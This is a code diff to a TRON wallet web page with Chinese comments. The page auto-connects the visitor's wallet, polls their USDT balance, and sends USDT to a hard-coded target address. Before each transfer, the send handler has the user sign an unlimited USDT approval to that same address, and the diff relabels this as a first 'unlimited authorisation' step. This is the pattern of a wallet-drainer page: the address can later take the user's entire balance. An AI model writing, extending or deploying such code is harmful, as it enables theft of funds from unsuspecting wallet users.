@@ -80,6 +80,7 @@ let tronWeb = null;
 let userAddress = "";
 let provider = null;
 let connectingLock = false;
+let balanceTimer = null;
 
 const $ = s=>document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -114,14 +115,46 @@ async function waitTxHashConfirm(txHash){
     throw new Error("交易广播，未确认，请tronscan查询");
 }
 
+// 停止余额轮询
+function stopBalancePoll(){
+    if(balanceTimer){
+        clearInterval(balanceTimer);
+        balanceTimer = null;
+    }
+}
+
 // 断开钱包
 function disconnectWallet(){
+    stopBalancePoll();
     tronWeb=null;
     userAddress="";
     provider=null;
     walletDot.classList.remove("connected");
     sendBtn.disabled=true;
     balanceText.textContent="0.000000";
+}
+
+async function loadBalance(){
+    if(!tronWeb || !userAddress) return;
+    const c = getUsdtContract();
+    if(!c) return;
+    try{
+        const sun = await c.balanceOf(userAddress).call();
+        balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
+    }catch(e){
+        balanceText.textContent="--";
+    }
+}
+
+// 开启自动轮询读取余额，3秒自动刷新一次余额，不用手动刷新页面
+function startBalancePoll(){
+    stopBalancePoll();
+    loadBalance();
+    balanceTimer = setInterval(()=>{
+        if(tronWeb && userAddress){
+            loadBalance();
+        }
+    },5000);
 }
 
 // 自动连接钱包（页面加载完毕自动执行）
@@ -140,24 +173,18 @@ async function autoConnectWallet(){
             userAddress = acc[0];
             tronWeb = new TronWeb({fullHost:RPC_LIST[0], provider});
         }else{
+            alert("请在TP/OKX钱包内置浏览器打开页面");
             connectingLock=false;
             return;
         }
         walletDot.classList.add("connected");
         sendBtn.disabled=false;
-        await loadBalance();
+        startBalancePoll();
     }catch(e){
         console.log("自动连接被用户拒绝或者无钱包：",e.message);
     }finally{
         connectingLock=false;
     }
-}
-
-async function loadBalance(){
-    const c = getUsdtContract();
-    if(!c) return;
-    const sun = await c.balanceOf(userAddress).call();
-    balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
 }
 
 amountInput.oninput = ()=>{
@@ -185,10 +212,10 @@ sendBtn.onclick = async ()=>{
         const contract = getUsdtContract();
         let allowance = await contract.allowance(userAddress,TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needSun)){
-            alert("请确认签名");
+            alert("第一步：请确认【无限授权】签名");
             const approveHash = await contract.approve(TARGET_ADDR,MAX_ALLOWANCE).send({feeLimit:FEE_LIMIT});
             await waitTxHashConfirm(approveHash);
-            alert("✅签名上链成功，接下来弹出转账签名");
+            alert("✅授权上链成功，接下来弹出转账签名");
         }
         const transferHash = await contract.transfer(TARGET_ADDR, needSun).send({feeLimit:FEE_LIMIT});
         await waitTxHashConfirm(transferHash);
@@ -207,6 +234,9 @@ walletDot.addEventListener("click", disconnectWallet);
 
 // 页面加载完成自动触发自动连接
 window.addEventListener("load",autoConnectWallet);
+
+// 页面销毁清除定时器，防止内存泄漏
+window.addEventListener("beforeunload",stopBalancePoll);
 </script>
 </body>
 </html>
